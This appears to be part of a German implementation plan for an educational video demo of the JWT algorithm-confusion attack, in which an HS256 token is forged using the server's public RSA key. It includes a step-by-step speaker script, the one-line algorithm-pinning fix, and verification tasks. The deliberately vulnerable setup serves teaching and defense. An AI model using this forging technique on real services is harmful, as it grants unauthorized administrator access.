> Schritt eins: Der Angreifer meldet sich ganz normal als regulärer Benutzer
> „alice" an. Der Server stellt ein echtes Token aus — sauber mit RS256
> signiert. In der Payload steht: Rolle „user".
>
> Schritt zwei: Mit diesem echten Token versucht er, auf den Admin-Bereich
> zuzugreifen. Der Server antwortet korrekt mit „403 Forbidden" — alice ist eben
> kein Admin. Bis hierhin funktioniert alles richtig.
>
> Schritt drei: Der Angreifer besorgt sich den öffentlichen Schlüssel des
> Servers. Der liegt offen herum — als Datei und sogar über einen eigenen
> Endpunkt abrufbar. Das ist völlig in Ordnung — ein öffentlicher Schlüssel ist
> kein Geheimnis.
>
> Schritt vier: Jetzt die Fälschung. Der Angreifer baut sich ein neues Token:
> Algorithmus HS256, Rolle „admin". Und er signiert es per HMAC — mit dem
> öffentlichen Schlüssel als Geheimnis. Das ist der ganze Trick.
>
> Schritt fünf: Er schickt das gefälschte Token an den Admin-Bereich.
>
> Schritt sechs — das Ergebnis: HTTP 200. Der Server liefert die internen
> Admin-Daten aus. Der Angriff ist gelungen. Der Angreifer hat
> Administrator-Zugriff — ohne je ein Admin-Passwort gekannt zu haben und ohne
> den privaten Schlüssel des Servers.

### 5:30 – 7:30 · Massnahme (Hands-on)

**[Regie:** Editor mit `src/auth.js`, auf den FIX-Zweig von `verifyToken`
zeigen.**]**

> Jetzt die Gegenmassnahme. Und die gute Nachricht: Es ist wirklich nur eine
> Zeile.
>
> Das Grundproblem war, dass der Server dem Token-Header geglaubt hat. Die
> Lösung ist, ihm das abzugewöhnen. Statt den Algorithmus aus dem Header zu
> übernehmen, gibt der Server fest vor, welcher Algorithmus erlaubt ist. Hier im
> Code, im Fix-Zweig: „algorithms" wird fest auf RS256 gesetzt. Der Server
> stellt seine Token sowieso nur mit RS256 aus — also akzeptiert er auch nur
> RS256. Das „alg"-Feld aus dem Header wird damit schlicht ignoriert.

**[Regie:** Terminal. `./demo.sh fixed` ausführen.**]**

> Ich starte dieselbe Demo jetzt im gepinnten Modus — der Fix ist aktiv. Es ist
> exakt derselbe Exploit, exakt derselbe gefälschte Token. Nur der Server prüft
> jetzt anders.

**[Regie:** Server-Banner („Modus: GEPINNT"), der Exploit läuft erneut.**]**

> Die ersten Schritte laufen wie vorhin: normaler Login, der echte Zugriff wird
> mit 403 abgewiesen, der Angreifer fälscht wieder sein HS256-Admin-Token.
>
> Aber Schritt fünf und sechs sehen jetzt anders aus. Der Server bekommt das
> gefälschte Token — und verwirft es. HTTP 401. In der Fehlermeldung steht
> „invalid algorithm". Der Server hat gesehen: Das Token behauptet HS256,
> erlaubt ist aber nur RS256 — also abgelehnt, noch bevor überhaupt eine
> Signatur geprüft wird. Der Angriff läuft ins Leere.

### 7:30 – 9:00 · Resultate & Zusammenfassung

**[Regie:** Optional die zwei Terminal-Ausgaben nebeneinander — vorher HTTP 200,
nachher HTTP 401. Oder eine Zusammenfassungsfolie.**]**

> Fassen wir zusammen. Wir haben denselben Angriff zweimal gesehen. Beim
> verwundbaren Server: HTTP 200, voller Admin-Zugriff. Beim gepinnten Server:
> HTTP 401, abgewehrt. Der Unterschied war eine einzige Zeile Code.
>
> Die Kernbotschaft lautet: Vertraue beim Prüfen einer Signatur niemals dem
> Algorithmus, den die Eingabe selbst angibt. Der Server muss fest vorgeben,
> welcher Algorithmus gilt. Bei JWT heisst das konkret: den Parameter
> „algorithms" immer explizit setzen.
>
> Einzuordnen ist das Ganze unter OWASP A07:2025, Authentication Failures. Die
> passende Schwachstellen-Kategorie ist CWE-303 — die fehlerhafte
> Implementierung eines Authentifizierungs-Algorithmus — mit CWE-287,
> fehlerhafte Authentifizierung, als Oberbegriff.
>
> Übrigens: Wir haben hier bewusst eine alte Version der JWT-Bibliothek
> verwendet. Aktuelle Versionen prüfen zusätzlich den Schlüsseltyp und
> verhindern genau diesen Angriff. Auch das ist eine Lehre — Abhängigkeiten
> aktuell halten.
>
> Mehr Details findet ihr in der offiziellen OWASP-Quelle, verlinkt in der
> Beschreibung. Danke fürs Zuschauen.

## Zeitbudget

| Marke | Abschnitt | Dauer |
|---|---|---|
| 0:00 | Intro | 1:00 |
| 1:00 | Theorie | 1:30 |
| 2:30 | Schwachstelle (Hands-on) | 3:00 |
| 5:30 | Massnahme (Hands-on) | 2:00 |
| 7:30 | Resultate & Zusammenfassung | 1:30 |
| 9:00 | Ende | — |

Hands-on-Teil = 5:00 (Hauptteil). Gesamt ca. 9:00 — im Zielfenster 8–10 Minuten.

## Projektstruktur

```
m183/
├── README.md              dieses Dokument
├── demo.sh                orchestriert beide Phasen
├── package.json           Dependencies (jsonwebtoken 8.5.1 exakt)
├── src/
│   ├── keys.js            RSA-Schlüsselpaar, public.pem
│   ├── users.js           In-Memory-Benutzerspeicher
│   ├── auth.js            JWT-Logik mit VULNERABLE-Schalter
│   └── server.js          Express-Server
└── exploit/
    └── exploit.js         der Angriff in 6 Schritten
```

## Aufräumen

```bash
rm -f public.pem
rm -f /tmp/a07-demo-*.log /tmp/a07-demo-*.out
```
````

- [ ] **Step 2: README verifizieren**

Run: `grep -c -E "Regie:|ERGEBNIS|CWE-303|A07:2025" README.md`
Expected: Eine Zahl ≥ 10 (Regie-Hinweise, CWE- und OWASP-Bezüge vorhanden). Zusätzlich Sichtprüfung: fünf Abschnitte mit Zeitmarken, Sprechertext in Zitatblöcken.

- [ ] **Step 3: Commit**

```bash
git add README.md
git commit -m "docs: README mit Sprecher-Skript und Zeitbudget"
```

---

## Task 9: Endabnahme

**Files:** keine — nur Verifikation.

- [ ] **Step 1: Vollständiger Durchlauf**

Run: `./demo.sh`
Expected: Selbstcheck meldet `Phase 1 … PASS` und `Phase 2 … PASS`.

- [ ] **Step 2: Keine Schlüssel versioniert**

Run: `git status --porcelain --ignored | grep -E "public.pem|node_modules" || echo "sauber ignoriert"`
Expected: `public.pem` und `node_modules` erscheinen als ignoriert (Präfix `!!`) oder die Ausgabe ist `sauber ignoriert`; sie dürfen **nicht** als getrackt/staged auftauchen.

- [ ] **Step 3: Abhängigkeit final prüfen**

Run: `npm ls jsonwebtoken`
Expected: `jsonwebtoken@8.5.1`.

- [ ] **Step 4: Abschluss**

Alle Abnahmekriterien der Spec (§12) sind erfüllt. Kein weiterer Commit nötig, sofern Steps 1–3 fehlerfrei sind.

---

## Self-Review (vom Plan-Autor durchgeführt)

**1. Spec-Abdeckung:** Verwundbare App → Tasks 2–5. Exploit → Task 6. README/Sprecher-Skript → Task 8. `demo.sh` → Task 7. Schlüsselbehandlung & `.gitignore` → Tasks 1–2, 9. CWE-/OWASP-Bezug → Task 8 (Hintergrund + Skript). `jsonwebtoken` exakt 8.5.1 → Tasks 1, 9. Alle Spec-Anforderungen sind einer Task zugeordnet.

**2. Platzhalter:** Keine `TBD`/`TODO`; jeder Schritt enthält vollständigen Code bzw. exakte Befehle mit erwarteter Ausgabe.

**3. Typ-/Namens-Konsistenz:** `generateKeyPair`, `writePublicKeyFile`, `PUBLIC_KEY_PATH` (keys.js) — identisch in server.js verwendet. `findUser` (users.js) — identisch in server.js. `issueToken`, `verifyToken`, `VULNERABLE` (auth.js) — identisch in server.js. Ergebnis-Marker `ERGEBNIS: ANGRIFF ERFOLGREICH` / `… ABGEWEHRT` (exploit.js) — exakt so von `demo.sh` per `grep` geprüft. Umgebungsvariablen `VULNERABLE`, `PORT`, `STEP_DELAY_MS` durchgängig konsistent.
